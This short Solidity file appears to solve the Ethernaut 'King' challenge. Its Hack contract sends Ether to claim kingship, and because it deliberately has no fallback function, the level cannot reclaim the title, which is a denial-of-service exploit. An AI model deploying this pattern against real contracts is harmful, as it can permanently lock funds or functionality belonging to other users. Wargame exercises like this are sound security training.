// SPDX-License-Identifier: MIT
pragma solidity ^0.6.5;

contract Hack {
    constructor(address _instanceAddr) public payable {
        address king = _instanceAddr;

        // send >1ETH to the level instance 
        (bool sent, ) = king.call{value: msg.value}("");
        require(sent, "Failed to send Ether");        
    }
    
}

// No Fallback so will not accept ETH when ethernaut claims kingship